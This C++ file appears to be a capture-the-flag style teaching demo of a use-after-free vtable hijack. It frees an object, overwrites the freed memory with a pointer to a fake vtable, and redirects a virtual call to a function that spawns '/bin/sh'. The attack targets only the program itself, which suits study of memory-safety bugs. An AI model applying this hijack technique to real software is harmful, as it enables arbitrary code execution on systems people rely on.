#include <iostream>
using namespace std;

/*
docker run --rm -it -v $(pwd):/work ctf_ubuntu_latest bash
g++ -g -no-pie uaf.cpp -o uaf
*/

void memory_dump(char *ptr, int size, int bytes) {
  puts("dump");
  for (int i = 0; i < size * 4; i++) {
    if (i % bytes == 0) printf(" ");
    printf("%02hhx", *(ptr + i));
  }
  puts("");
}

void shellcode() {
  // fix stack alignment 0x10 syscall
  //__asm__("pop %rax");  // fix stack
  system("/bin/sh");
}

class Base {
 public:
  virtual void func() {}
};

class Vuln : public Base {
 public:
  int mark0 = 0xfaceb00c;
  virtual void func() override { cout << "function!" << endl; }
  int mark1 = 0xdeadbeef;
  char array[10];
};

typedef struct {
  void (*func_ptr)();
} VTable;

int main() {
  Vuln *vuln1 = new Vuln();
  vuln1->func();

  cout << sizeof(Vuln) << " " << vuln1 << endl;
  memory_dump((char *)vuln1, sizeof(Vuln), 2);

  // free
  delete vuln1;

  // overwrite
  cout << "overwrite " << hex << reinterpret_cast<size_t>(shellcode) << endl;
  long long int *target = new long long int[32 / 8];

  // fake vtable
  VTable vtb;
  vtb.func_ptr = shellcode;

  // hijack by UaF
  target[0] = reinterpret_cast<size_t>(&vtb);
  cout << "class object ";
  memory_dump((char *)vuln1, sizeof(Vuln), 2);

  // exec func again
  cout << "exec again" << endl;
  vuln1->func();

  return 0;
}

